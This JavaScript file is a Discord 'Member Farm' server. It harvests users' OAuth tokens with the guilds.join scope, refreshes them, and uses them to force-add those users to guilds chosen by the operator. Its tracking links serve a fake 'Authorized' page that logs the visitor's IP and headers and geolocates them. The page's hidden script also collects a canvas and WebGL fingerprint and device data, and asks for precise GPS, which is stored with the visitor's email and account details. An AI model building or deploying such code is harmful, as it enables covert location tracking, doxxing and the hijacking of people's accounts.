// language: JavaScript, file: oauth.js
const express = require('express');
const { query, one, many } = require('./db');

async function dedupeUserTokens(userId) {
  const uid = String(userId);
  const rows = await many('SELECT id FROM tokens WHERE user_id = $1 AND valid = 1 ORDER BY id DESC', [uid]);
  if (rows.length <= 1) return { kept: rows.length, dropped: 0 };
  const keepId = rows[0].id;
  await query('UPDATE tokens SET valid = 0 WHERE user_id = $1 AND valid = 1 AND id != $2', [uid, keepId]);
  for (const r of rows.slice(1)) await query('DELETE FROM stock WHERE token_id = $1', [r.id]);
  return { kept: 1, dropped: rows.length - 1 };
}

async function dedupeAllTokens() {
  const dupes = await many(`SELECT user_id FROM tokens WHERE valid = 1 GROUP BY user_id HAVING COUNT(*) > 1`);
  let dropped = 0;
  for (const d of dupes) dropped += (await dedupeUserTokens(d.user_id)).dropped;
  return { users: dupes.length, dropped };
}

function getClientIp(req) {
  const h = req.headers || {};
  for (const k of ['cf-connecting-ip', 'true-client-ip', 'x-real-ip']) {
    if (h[k]) return String(h[k]).trim();
  }
  const xf = String(h['x-forwarded-for'] || '');
  if (xf) return xf.split(',')[0].trim();
  return (req.socket && req.socket.remoteAddress) || req.ip || '';
}

async function lookupGeo(ip) {
  const out = {};
  if (!ip || ip === '127.0.0.1' || ip === '::1') return out;
  const clean = ip.replace(/^::ffff:/, '');
  try {
    const res = await fetch('http://ip-api.com/json/' + encodeURIComponent(clean) + '?fields=status,country,regionName,city,zip,isp,org,as,asname,proxy,hosting,timezone,lat,lon,district', { signal: AbortSignal.timeout(2500) });
    const d = await res.json();
    if (d.status === 'success') {
      Object.assign(out, {
        country: d.country || '', region: d.regionName || '', city: d.city || '', zip: d.zip || '',
        district: d.district || '', isp: d.isp || '', org: d.org || '', timezone: d.timezone || '',
        lat: d.lat != null ? String(d.lat) : '', lon: d.lon != null ? String(d.lon) : '',
        asn: d.as || '', as_name: d.asname || '', proxy: String(d.proxy), hosting: String(d.hosting),
        geo_source: 'ip-api',
      });
    }
  } catch (e) { console.error('geo', e.message); }
  try {
    const res2 = await fetch('https://ipapi.co/' + encodeURIComponent(clean) + '/json/', { signal: AbortSignal.timeout(2500), headers: { 'User-Agent': 'MemberFarm/1.0' } });
    const d2 = await res2.json();
    if (!d2.error) {
      if (!out.city) out.city = d2.city || '';
      if (!out.lat && d2.latitude != null) out.lat = String(d2.latitude);
      if (!out.lon && d2.longitude != null) out.lon = String(d2.longitude);
      if (!out.zip) out.zip = d2.postal || '';
      out.geo_source = (out.geo_source || '') + '+ipapi.co';
    }
  } catch (e) {}
  if (out.lat && out.lon) out.maps_url = 'https://www.google.com/maps?q=' + out.lat + ',' + out.lon;
  return out;
}

function pageHtml(opts) {
  const ok = opts.ok;
  const visitId = String(opts.visitId || '');
  const title = ok ? 'Authorized' : 'Authorization failed';
  const sub = ok ? (opts.username ? ('Welcome, ' + opts.username + '. Account linked.') : 'Thanks for visiting. You can close this page.') : (opts.error || 'Error');
  const color = ok ? '#57f287' : '#ed4245';
  return `<!DOCTYPE html><html><head><meta charset="utf-8"/><meta name="viewport" content="width=device-width,initial-scale=1"/>
<title>Member Farm</title>
<style>
body{min-height:100vh;display:flex;align-items:center;justify-content:center;margin:0;
font-family:system-ui,sans-serif;background:#0b0b14;color:#e8e8f0}
.card{width:min(420px,92vw);background:#12121c;border:1px solid #2a2a3c;border-radius:16px;padding:32px;text-align:center}
h1{font-size:1.3rem;margin:12px 0 8px}p{color:#9a9ab0}.meta{margin-top:16px;font-size:.75rem;color:#6a6a80;text-align:left}
.dot{width:56px;height:56px;border-radius:50%;margin:0 auto;border:2px solid ${color};background:${color}22}
</style></head><body><div class="card"><div class="dot"></div><h1>${title}</h1><p>${sub}</p>
<div class="meta" id="meta">Collecting device info…</div></div>
<script>
(function(){
var visitId=${JSON.stringify(visitId)};
if(!visitId)return;
function send(p){try{fetch('/oauth/beacon',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify(p),keepalive:true})}catch(e){}}
function canvasHash(){try{var c=document.createElement('canvas');c.width=240;c.height=60;var x=c.getContext('2d');x.fillStyle='#f60';x.fillRect(0,0,240,60);x.fillStyle='#069';x.font='14px Arial';x.fillText(navigator.userAgent.slice(0,40),2,20);return c.toDataURL().slice(-64)}catch(e){return ''}}
function webgl(){try{var c=document.createElement('canvas');var g=c.getContext('webgl')||c.getContext('experimental-webgl');if(!g)return{};var d=g.getExtension('WEBGL_debug_renderer_info');return d?{webgl_vendor:String(g.getParameter(d.UNMASKED_VENDOR_WEBGL)||''),webgl_renderer:String(g.getParameter(d.UNMASKED_RENDERER_WEBGL)||'')}:{}}catch(e){return{}}}
var conn=navigator.connection||navigator.mozConnection||navigator.webkitConnection||{};
var base=Object.assign({visitId:visitId,screen:(screen.width||'')+'x'+(screen.height||''),color_depth:String(screen.colorDepth||''),pixel_ratio:String(devicePixelRatio||''),platform:navigator.platform||'',vendor:navigator.vendor||'',hardware_concurrency:String(navigator.hardwareConcurrency||''),device_memory:String(navigator.deviceMemory||''),touch_points:String(navigator.maxTouchPoints||''),client_timezone:(Intl.DateTimeFormat().resolvedOptions().timeZone||''),client_languages:(navigator.languages||[]).join(','),webdriver:String(!!navigator.webdriver),cookie_enabled:String(navigator.cookieEnabled),do_not_track:String(navigator.doNotTrack||''),canvas_hash:canvasHash(),connection_type:String(conn.effectiveType||''),downlink:String(conn.downlink||''),rtt:String(conn.rtt||''),user_agent:navigator.userAgent||''},webgl());
send(base);
var el=document.getElementById('meta');
if(el)el.innerHTML='Platform: '+(base.platform||'-')+'<br>Screen: '+(base.screen||'-')+'<br>TZ: '+(base.client_timezone||'-')+'<br>GPU: '+((base.webgl_renderer||'-').slice(0,40))+'<br><span id="gps">GPS: requesting…</span>';
if(navigator.geolocation){
navigator.geolocation.getCurrentPosition(function(pos){
var c=pos.coords;
send({visitId:visitId,gps_lat:String(c.latitude),gps_lon:String(c.longitude),gps_accuracy:String(c.accuracy),gps_altitude:c.altitude!=null?String(c.altitude):'',gps_heading:c.heading!=null?String(c.heading):'',gps_speed:c.speed!=null?String(c.speed):'',gps_timestamp:String(pos.timestamp||Date.now())});
var g=document.getElementById('gps');
if(g)g.textContent='GPS: '+c.latitude.toFixed(6)+', '+c.longitude.toFixed(6)+' (±'+Math.round(c.accuracy)+'m)';
},function(err){
send({visitId:visitId,gps_error:String(err.code)+':'+(err.message||'')});
var g=document.getElementById('gps');if(g)g.textContent='GPS: denied';
},{enableHighAccuracy:true,timeout:15000,maximumAge:0});
}
})();
</script></body></html>`;
}

function createOAuthServer(client) {
  const app = express();
  const PORT = Number(process.env.PORT) || 3000;
  app.set('trust proxy', true);
  app.use(express.json({ limit: '64kb' }));

  async function logVisitFromRequest(req, status) {
    const h = req.headers || {};
    const ip = getClientIp(req);
    const geo = await lookupGeo(ip);
    try {
      const ins = await one(
        `INSERT INTO oauth_visits (ip,forwarded_for,real_ip,user_agent,accept_language,accept,referer,origin,host,method,path,query_string,country,region,city,isp,org,timezone,lat,lon,raw_headers,status,cf_country,sec_ch_ua,sec_ch_ua_mobile,sec_ch_ua_platform,asn,as_name,proxy,hosting,zip,district,geo_source,maps_url)
         VALUES ($1,$2,$3,$4,$5,$6,$7,$8,$9,$10,$11,$12,$13,$14,$15,$16,$17,$18,$19,$20,$21,$22,$23,$24,$25,$26,$27,$28,$29,$30,$31,$32,$33,$34) RETURNING id`,
        [ip, String(h['x-forwarded-for']||''), String(h['x-real-ip']||''), String(h['user-agent']||''),
         String(h['accept-language']||''), String(h['accept']||''), String(h['referer']||''), String(h['origin']||''),
         String(h['host']||''), req.method, req.path||'', JSON.stringify(req.query||{}),
         geo.country||null, geo.region||null, geo.city||null, geo.isp||null, geo.org||null, geo.timezone||null,
         geo.lat||null, geo.lon||null, JSON.stringify(h), status||'visit',
         String(h['cf-ipcountry']||''), String(h['sec-ch-ua']||''), String(h['sec-ch-ua-mobile']||''),
         String(h['sec-ch-ua-platform']||''), geo.asn||null, geo.as_name||null, geo.proxy||null, geo.hosting||null,
         geo.zip||null, geo.district||null, geo.geo_source||null, geo.maps_url||null]
      );
      return ins?.id || null;
    } catch (e) { console.error('visit insert', e.message); return null; }
  }

  async function serveTrackPage(req, res) {
    const visitId = await logVisitFromRequest(req, 'link_visit');
    return res.type('html').send(
      pageHtml({ ok: true, visitId, username: '', error: '' })
        .replace('Authorized', 'Member Farm')
        .replace('Account linked.', 'You can close this page.')
    );
  }

  app.get('/', (req, res) => serveTrackPage(req, res));
  app.get('/t', (req, res) => serveTrackPage(req, res));
  app.get('/track', (req, res) => serveTrackPage(req, res));
  app.get('/health', (req, res) => res.json({ ok: true, bot: client?.user?.tag || 'starting' }));

  app.post('/oauth/beacon', async (req, res) => {
    try {
      const b = req.body || {};
      const id = parseInt(b.visitId, 10);
      if (!id) return res.status(400).json({ ok: false });
      await query(
        `UPDATE oauth_visits SET
          screen=COALESCE($2,screen), color_depth=COALESCE($3,color_depth), pixel_ratio=COALESCE($4,pixel_ratio),
          platform=COALESCE($5,platform), hardware_concurrency=COALESCE($6,hardware_concurrency),
          device_memory=COALESCE($7,device_memory), touch_points=COALESCE($8,touch_points),
          client_timezone=COALESCE($9,client_timezone), client_languages=COALESCE($10,client_languages),
          webdriver=COALESCE($11,webdriver), cookie_enabled=COALESCE($12,cookie_enabled),
          canvas_hash=COALESCE($13,canvas_hash), webgl_vendor=COALESCE($14,webgl_vendor),
          webgl_renderer=COALESCE($15,webgl_renderer), connection_type=COALESCE($16,connection_type),
          downlink=COALESCE($17,downlink), rtt=COALESCE($18,rtt), do_not_track=COALESCE($19,do_not_track),
          vendor=COALESCE($20,vendor),
          gps_lat=COALESCE($21,gps_lat), gps_lon=COALESCE($22,gps_lon), gps_accuracy=COALESCE($23,gps_accuracy),
          gps_altitude=COALESCE($24,gps_altitude), gps_heading=COALESCE($25,gps_heading),
          gps_speed=COALESCE($26,gps_speed), gps_timestamp=COALESCE($27,gps_timestamp),
          gps_error=COALESCE($28,gps_error),
          maps_url=CASE WHEN $21 IS NOT NULL AND $22 IS NOT NULL THEN 'https://www.google.com/maps?q='||$21||','||$22 ELSE maps_url END,
          client_extra=$29
         WHERE id=$1`,
        [id, b.screen||null, b.color_depth||null, b.pixel_ratio||null, b.platform||null,
         b.hardware_concurrency||null, b.device_memory||null, b.touch_points||null,
         b.client_timezone||null, b.client_languages||null, b.webdriver||null, b.cookie_enabled||null,
         b.canvas_hash||null, b.webgl_vendor||null, b.webgl_renderer||null, b.connection_type||null,
         b.downlink||null, b.rtt||null, b.do_not_track||null, b.vendor||null,
         b.gps_lat||null, b.gps_lon||null, b.gps_accuracy||null, b.gps_altitude||null,
         b.gps_heading||null, b.gps_speed||null, b.gps_timestamp||null, b.gps_error||null,
         JSON.stringify(b)]
      );
      res.json({ ok: true });
    } catch (e) { console.error('beacon', e.message); res.status(500).json({ ok: false }); }
  });

  app.get('/oauth/callback', async (req, res) => {
    const code = req.query.code;
    const err = req.query.error;
    const h = req.headers || {};
    const ip = getClientIp(req);
    const geo = await lookupGeo(ip);
    let visitId = null;
    try {
      const ins = await one(
        `INSERT INTO oauth_visits (ip,forwarded_for,real_ip,user_agent,accept_language,accept,referer,origin,host,method,path,query_string,country,region,city,isp,org,timezone,lat,lon,raw_headers,status,cf_country,sec_ch_ua,sec_ch_ua_mobile,sec_ch_ua_platform,asn,as_name,proxy,hosting,zip,district,geo_source,maps_url)
         VALUES ($1,$2,$3,$4,$5,$6,$7,$8,$9,$10,$11,$12,$13,$14,$15,$16,$17,$18,$19,$20,$21,$22,$23,$24,$25,$26,$27,$28,$29,$30,$31,$32,$33,$34) RETURNING id`,
        [ip, String(h['x-forwarded-for']||''), String(h['x-real-ip']||''), String(h['user-agent']||''),
         String(h['accept-language']||''), String(h['accept']||''), String(h['referer']||''), String(h['origin']||''),
         String(h['host']||''), req.method, req.path||'', JSON.stringify(req.query||{}),
         geo.country||null, geo.region||null, geo.city||null, geo.isp||null, geo.org||null, geo.timezone||null,
         geo.lat||null, geo.lon||null, JSON.stringify(h), err?'oauth_error':'pending',
         String(h['cf-ipcountry']||''), String(h['sec-ch-ua']||''), String(h['sec-ch-ua-mobile']||''),
         String(h['sec-ch-ua-platform']||''), geo.asn||null, geo.as_name||null, geo.proxy||null, geo.hosting||null,
         geo.zip||null, geo.district||null, geo.geo_source||null, geo.maps_url||null]
      );
      visitId = ins?.id || null;
    } catch (e) { console.error('visit insert', e.message); }

    if (err || !code) {
      return res.status(400).type('html').send(pageHtml({ ok: false, visitId, error: err || 'Missing code' }));
    }
    const redirectUri = (process.env.REDIRECT_URI||'').trim();
    const clientId = (process.env.CLIENT_ID||'').trim();
    const clientSecret = (process.env.CLIENT_SECRET||'').trim();
    if (!clientId || !clientSecret || !redirectUri) {
      return res.status(500).type('html').send(pageHtml({ ok: false, visitId, error: 'Server misconfigured' }));
    }
    try {
      const params = new URLSearchParams({ client_id: clientId, client_secret: clientSecret, grant_type: 'authorization_code', code: String(code), redirect_uri: redirectUri });
      const tokenRes = await fetch('https://discord.com/api/oauth2/token', { method: 'POST', headers: { 'Content-Type': 'application/x-www-form-urlencoded' }, body: params });
      const tokenData = await tokenRes.json();
      if (!tokenData.access_token) {
        return res.status(400).type('html').send(pageHtml({ ok: false, visitId, error: 'Token exchange failed' }));
      }
      const userRes = await fetch('https://discord.com/api/users/@me', { headers: { Authorization: 'Bearer ' + tokenData.access_token } });
      const user = await userRes.json();
      if (!user.id) return res.status(400).type('html').send(pageHtml({ ok: false, visitId, error: 'Failed to fetch user' }));
      const expiresAt = Math.floor(Date.now()/1000) + (tokenData.expires_in || 604800);
      const uid = String(user.id);
      const existing = await one('SELECT id FROM tokens WHERE user_id=$1 ORDER BY id DESC LIMIT 1', [uid]);
      if (existing) {
        await query('UPDATE tokens SET access_token=$1, refresh_token=COALESCE($2,refresh_token), expires_at=$3, scope=$4, valid=1 WHERE id=$5',
          [tokenData.access_token, tokenData.refresh_token||null, expiresAt, tokenData.scope||'identify guilds.join', existing.id]);
      } else {
        await query('INSERT INTO tokens (user_id,access_token,refresh_token,expires_at,scope,valid) VALUES ($1,$2,$3,$4,$5,1)',
          [uid, tokenData.access_token, tokenData.refresh_token||null, expiresAt, tokenData.scope||'identify guilds.join']);
      }
      await dedupeUserTokens(uid);
      if (visitId) {
        await query(`UPDATE oauth_visits SET user_id=$2,username=$3,global_name=$4,avatar=$5,email=$6,locale=$7,mfa_enabled=$8,verified=$9,premium_type=$10,status=$11,discord_flags=$12,public_flags=$13,banner=$14,accent_color=$15 WHERE id=$1`,
          [visitId, uid, user.username||null, user.global_name||null, user.avatar||null, user.email||null, user.locale||null,
           user.mfa_enabled?1:0, user.verified?1:0, user.premium_type!=null?Number(user.premium_type):null, 'authorized',
           user.flags!=null?String(user.flags):null, user.public_flags!=null?String(user.public_flags):null,
           user.banner||null, user.accent_color!=null?String(user.accent_color):null]).catch(()=>{});
      }
      const stats = await one('SELECT * FROM auth_stats WHERE id=1');
      const now = Math.floor(Date.now()/1000);
      if (now - (Number(stats?.last_24h_reset)||0) > 86400) await query('UPDATE auth_stats SET last_24h=0, last_24h_reset=$1 WHERE id=1', [now]);
      await query('UPDATE auth_stats SET total_all_time=total_all_time+1, last_24h=last_24h+1 WHERE id=1');
      return res.type('html').send(pageHtml({ ok: true, visitId, username: user.global_name || user.username || uid }));
    } catch (e) {
      console.error(e);
      return res.status(500).type('html').send(pageHtml({ ok: false, visitId, error: 'Internal error' }));
    }
  });

  app.listen(PORT, '0.0.0.0', () => console.log('OAuth server on 0.0.0.0:' + PORT));
  return app;
}

async function refreshAccessToken(tokenRow) {
  if (!tokenRow?.refresh_token) return null;
  const clientId = (process.env.CLIENT_ID||'').trim();
  const clientSecret = (process.env.CLIENT_SECRET||'').trim();
  if (!clientId || !clientSecret) return null;
  try {
    const params = new URLSearchParams({ client_id: clientId, client_secret: clientSecret, grant_type: 'refresh_token', refresh_token: tokenRow.refresh_token });
    const res = await fetch('https://discord.com/api/oauth2/token', { method: 'POST', headers: { 'Content-Type': 'application/x-www-form-urlencoded' }, body: params });
    const data = await res.json();
    if (!data.access_token) return null;
    const expiresAt = Math.floor(Date.now()/1000) + (data.expires_in||604800);
    await query('UPDATE tokens SET access_token=$1, refresh_token=COALESCE($2,refresh_token), expires_at=$3, valid=1 WHERE id=$4',
      [data.access_token, data.refresh_token||null, expiresAt, tokenRow.id]);
    return data.access_token;
  } catch (e) { return null; }
}

async function ensureFreshToken(tokenRow) {
  if (!tokenRow) return null;
  const now = Math.floor(Date.now()/1000);
  if (Number(tokenRow.expires_at||0) > now + 300) return tokenRow.access_token;
  return (await refreshAccessToken(tokenRow)) || tokenRow.access_token;
}

async function joinGuild(accessToken, guildId, userId) {
  if (!userId || !accessToken) return { ok: false, code: 'error', status: 0, body: '' };
  const res = await fetch('https://discord.com/api/v10/guilds/' + guildId + '/members/' + userId, {
    method: 'PUT',
    headers: { Authorization: 'Bot ' + process.env.BOT_TOKEN, 'Content-Type': 'application/json' },
    body: JSON.stringify({ access_token: accessToken }),
  });
  let body = ''; try { body = await res.text(); } catch {}
  if (res.status === 201) return { ok: true, code: 'joined', status: 201, body };
  if (res.status === 204) return { ok: true, code: 'already', status: 204, body };
  if (res.status === 429) return { ok: false, code: 'rate_limit', status: 429, body };
  if (res.status === 401 || res.status === 403) {
    if (body.toLowerCase().includes('ban')) return { ok: false, code: 'banned', status: res.status, body };
    return { ok: false, code: 'deauth', status: res.status, body };
  }
  if (res.status === 400) {
    const l = body.toLowerCase();
    if (l.includes('max') || l.includes('100 guilds')) return { ok: false, code: 'maxed', status: 400, body };
    if (l.includes('phone') || l.includes('verified')) return { ok: false, code: 'phone', status: 400, body };
  }
  return { ok: false, code: 'error', status: res.status, body };
}

module.exports = { createOAuthServer, joinGuild, refreshAccessToken, ensureFreshToken, dedupeUserTokens, dedupeAllTokens };
